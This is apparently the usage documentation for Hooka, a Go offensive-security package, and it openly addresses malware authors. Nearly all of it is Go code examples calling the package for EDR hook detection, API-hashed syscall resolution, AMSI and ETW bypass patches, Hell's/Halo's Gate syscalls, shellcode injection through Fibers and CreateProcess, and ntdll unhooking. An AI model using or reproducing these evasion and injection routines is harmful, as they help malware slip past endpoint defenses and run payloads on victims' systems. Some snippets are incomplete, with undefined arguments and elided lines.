# Library

If you're looking to implement any function in your malware you can do it using the official package API. First of all download the package

```sh
go get github.com/D3Ext/Hooka/pkg/hooka
```

Here you have some real examples

> Detect hooked functions (including false positives)
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Returns all hooked functions
  hooks, err := hooka.DetectHooks() // func DetectHooks() ([]string, error)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(hooks)

  // Check if an especific function is hooked
  check, err := hooka.IsHooked("NtCreateThread") // func IsHooked(funcname string) (bool, error)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println(check) // true or false
}
```

> Resolve syscalls via API hashing
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){

  // 8c2beefa1c516d318252c9b1b45253e0549bb1c4 = NtCreateThread
  // it comes from: hooka.HashFromFunc("NtCreateThread")

  // Returns a pointer to function like NewProc()
  proc, err := hooka.FuncFromHash("8c2beefa1c516d318252c9b1b45253e0549bb1c4")
  if err != nil {
    log.Fatal(err)
  }

  // Now use the procedure as loading it from dll
  r, err := hooka.Syscall(
    proc,
    arg1,
    arg2,
    arg3,
    arg4,
  )

  ...
}
```

> Apply AMSI and ETW patch
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Amsi bypass
  err := hooka.PatchAmsi()
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("AMSI bypassed!")

  // ETW bypass
  err = hooka.PatchEtw()
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("ETW bypassed!")
}
```

> Get syscall id with Hell's Gate + Halo's Gate
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Get syscall id of function, only ntdll.dll is supported
  sysId, err := hooka.GetSysId("NtCreateThread") // func GetSysId(funcname string) (uint16, error)
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("Syscall ID:", sysId)
  r, err := hooka.Syscall( // Execute syscall
    sysId,  // especify func
    arg1,   // pass neccesary arguments
    arg2,
    arg3,
    arg4,
  )

  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("Error code:", r)
}
```

> Use shellcode injection techniques
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

var calc_shellcode = []byte{}

func main(){
  err := hooka.Fibers(calc_shellcode)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("Shellcode injected via Fibers")

  err = hooka.CreateProcess(calc_shellcode)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("Shellcode injected via CreateProcess")

  ...
}
```

> Unhook a function (3 ways)
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  // Use classic technique
  err := hooka.ClassicUnhook("NtCreateThread", "C:\\Windows\\System32\\ntdll.dll")
  if err != nil {
    log.Fatal(err)
  }

  // This technique loads original ntdll.dll from disk into memory to restore all functions
  err = hooka.FullUnhook("C:\\Windows\\System32\\ntdll.dll")
  if err != nil {
    log.Fatal(err)
  }

  // Use modern Perun's Fart technique
  err = hooka.PerunsUnhook()
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println("[+] Functions should have been unhooked!")
}
```

> Get function pointer
```go
package main

import (
  "fmt"
  "log"

  "github.com/D3Ext/Hooka/pkg/hooka"
)

func main(){
  ptr, err := hooka.GetFuncPtr("NtCreateThread")
  if err != nil {
    log.Fatal(err)
  }

  fmt.Println(ptr)
}
```


